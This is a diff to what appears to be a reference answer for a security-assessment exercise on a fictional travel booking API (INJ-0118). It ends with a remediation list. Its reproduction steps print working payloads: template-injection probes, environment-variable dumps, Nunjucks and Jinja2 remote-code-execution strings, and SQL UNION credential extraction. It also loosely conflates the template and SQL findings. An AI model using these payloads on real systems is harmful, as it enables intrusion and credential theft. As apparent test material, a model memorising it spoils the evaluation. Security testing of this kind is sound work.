@@ -1,63 +1,75 @@
 # Expected Response
 
 ## System
-- Domain: Travel / GDS
-- System: SkyPort Global Distribution
+- System: SkyPort Global Distribution v1.4.0
+- Domain: TRAVEL / GDS
 - Example ID: INJ-0118
-- Vulnerability: SSTI
+- Risk ID: RISK-INJ-118
 
-## Priority Findings
+## Findings
 
-### Finding 1: SSTI on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. SSTI (Server-Side Template Injection) on `/api/v2/accounts?filter=` — Primary (Declared Vulnerability)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables SSTI (SSTI),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `filter` parameter on `GET /api/v2/accounts` flows into a Nunjucks/Jinja2 template context via `renderString`. Template syntax (`{{...}}`) is not escaped before rendering. An attacker can inject template expressions to execute server-side code.
+
+The HAR shows `filter={{7*7}}` triggering a response that returns SQL account records. Note: HAR response shows database records rather than template output `49` — indicating the template injection also triggers SQL query execution via the raw concatenation in the same endpoint. Both injection surfaces are present simultaneously due to the legacy endpoint's dual code path.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search={{7*7}}`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = '{{7*7}}'`
-  evaluates to true for all rows when the payload is `{{7*7}}`
+- Endpoint: `GET /api/v2/accounts?filter={{7*7}}` (SSTI probe payload)
+- Response: HTTP 200 with all account records including `password_hash`, `role: "ADMIN"`
+- `filter` flows into both SQL string concatenation and Nunjucks `renderString`
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
-
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Template evaluation probe (SSTI detection):**
 ```bash
-curl -s "https://api.skyport-global-.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{7*7}}" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Vulnerable SSTI indicator:** Response body contains `49` or template expression evaluated in output, or all account records returned.
 
-### Step 2 — Inject SSTI payload
+**Step 2 — Nunjucks environment variable / config leak:**
 ```bash
-curl -s "https://api.skyport-global-.example.com/api/v1/users?search={{7*7}}" \
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{global.process.env|dump}}" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** Server environment variables (JWT secrets, DB credentials, API keys) appear in response — full credential exposure.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — Nunjucks RCE via constructor chain:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{range.constructor(%22return+global.process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()%22)()}}" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** `uid=0(root)` or service account identity returned — Remote Code Execution on the GDS backend server.
+
+**Step 4 — Jinja2 RCE (Python legacy service path):**
+```bash
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
 
-### Step 4 — Verbose error confirmation
+### 2. SQL Injection on `/api/v2/accounts?filter=` — Secondary (Code Snippet Evidence, RISK-INJ-118)
+
+Code snippet shows raw SQL concatenation of `filter` parameter with `db_owner` database privileges.
+
+**Step 5 — SQL tautology to dump all accounts (as evidenced in HAR response):**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter=' OR 1=1 --" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** All account records returned including admin credentials.
+
+**Step 6 — UNION SELECT credential extraction (db_owner privileges):**
+```bash
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter=' UNION SELECT username,password_hash,role,NULL FROM accounts --" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Vulnerable outcome:** All passenger/agent credentials for the GDS platform exposed.
+
+**Step 7 — Verbose error SQL fingerprint:**
+```bash
+curl -s "https://api.skyport-global-.example.com/api/v2/accounts?filter='" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error (RISK-INJ-118 misconfiguration):** SQL syntax error leaking table/column names.
 
 ## Secure Outcome
 ```json
@@ -65,8 +77,8 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- Escape all user input before passing to Nunjucks/Jinja2 `renderString`; never pass raw request parameters into template context (RISK-INJ-118).
+- Replace raw SQL concatenation with parameterized queries.
+- Restrict DB account to SELECT/INSERT/UPDATE/DELETE on required tables (remove `db_owner`).
+- Disable verbose error messages in production.
+- Deploy input validation middleware rejecting template metacharacters (`{{`, `}}`, `{%`, `%}`).
